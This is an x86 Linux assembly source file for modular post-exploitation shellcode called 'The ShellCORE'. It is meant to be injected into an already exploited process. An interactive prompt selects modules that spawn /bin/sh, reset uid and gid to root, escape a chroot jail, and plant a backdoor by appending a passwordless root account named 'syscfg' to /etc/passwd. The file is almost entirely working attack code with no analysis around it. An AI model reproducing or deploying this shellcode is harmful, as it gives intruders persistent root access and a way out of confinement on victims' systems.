;# Description: SCORE - The ShellCORE
;#              score is a complete shellcode for x86 processors running
;#              linux. It is designed to help work further with an exploited
;#              process.
;#
;#    Coded by: prdelka

;#########################
;#        [CORE]         #
;#########################

;--- NOP Equivalent instruction
     cld
     cld
     cld
     cld
     cld
     cld
     cld
     cld
     cld
     cld
     cld
     cld

;--- core initialise
     jmp $+0x06
     pop edi
     push edi
     jmp edi
     call $-0x04
;--- core prompt
     pop edi
     push 0x3e0a7964
     push 0x61655220
     push 0x65726f43
     xor eax,eax
     mov al,0x4
     xor ebx,ebx
     mov bl,0x1
     mov ecx,esp
     xor edx,edx
     mov dl,0xc
     int 0x80
;--- core read choice
     xor eax,eax
     mov ebp,esp
     push eax
     mov al,0x3
     xor ebx,ebx
     mov bl,0x1
     mov ecx,ebp
     xor edx,edx
     mov dl,0x2
     int 0x80
;--- core module selector
     mov edx,ebp

;### [backdoor module] 'b'
     cmp word[edx],0x0a62
     je $+0x5e
;### [break-chroot-jail module] 'j'
     cmp word[edx],0x0a6a
     je $+0x59
;### [privilege restore module] 'p'
     cmp word[edx],0x0a70
     je $+0x37
;### [shellcode module] 's'
     cmp word[edx],0x0a73
     je $+0x14
;### [exit module] 'x'
     cmp word[edx],0x0a78
     je $+0x05
;--- core loop
     push edi
     jmp edi

;#########################
;#       [MODULES]       #
;#########################

;--- [exit module]
     xor eax,eax
     mov al,0x1
     xor ebx,ebx
     int 0x80

;--- [shellcode module]
     xor eax,eax
     push eax
     push 0x68732f2f
     push 0x6e69622f
     mov ebx,esp
     push eax
     mov edx,esp
     push ebx
     mov ecx,esp
     mov al,0xB
     int 0x80
;### [core loop]
     push edi
     jmp edi

;--- [privilege restore module]
     xor eax,eax
     mov ah,0x17
     shr eax,0x8
     xor ebx,ebx
     int 0x80
     xor eax,eax
     mov ah,0x2e
     shr eax,0x8
     xor ebx,ebx
     int 0x80
;### [core loop]
     push edi
     jmp edi

;### [LONG backdoor module jump]
     jmp $+0x46

;--- [break-chroot-jail]
     xor eax,eax
     push eax
     push 0x6c69616a
     mov ebx,esp
     mov edx,esp
     mov cx,0x2F3
     mov al,0x27
     int 0x80
     xor eax,eax
     push eax
     mov ebx,edx
     mov al,0x3d
     int 0x80
     push 0x2e2e2e2e
     mov ebx,esp
     add bl,0x2
     mov edx,ebx
     xor ecx,ecx
     mov cl,0xff
     mov al,0x0c
     mov ebx,edx
     int 0x80
     loop $-0x06
     mov ebx,edx
     add bl,0x1
     mov al,0x3d
     int 0x80
;### [core loop]
     push edi
     jmp edi

;--- [backdoor module]
     xor eax,eax
     push eax
     push 0x64777373
     push 0x61702f2f
     push 0x6374652f
     mov esi,esp
     xor edx,edx
     xor ecx,ecx
     mov cl,0x01
     mov ebx,esi
     xor eax,eax
     mov al,0x5
     int 0x80
     push eax
     mov esi,esp
     xor eax,eax
     mov al,0x13
     mov ebx,[esi]
     xor ecx,ecx
     xor edx,edx
     mov dl,0x2
     int 0x80
     xor eax,eax
     mov al,0x4
     mov ebx,[esi]
     xor ecx,ecx
     push ecx
     push 0x0a687361
     push 0x622f6e69
     push 0x622f3a74
     push 0x6f6f722f
     push 0x3a676663
     push 0x20726f66
     push 0x20726573
     push 0x75206d65
     push 0x74737973
     push 0x3a303a30
     push 0x3a3a6766
     push 0x63737973
     mov ecx,esp
     xor edx,edx
     mov dl,0x30
     int 0x80
     xor eax,eax
     mov al,0x6
     mov ebx,[esi]
     int 0x80
;### [core loop]
     push edi
     jmp edi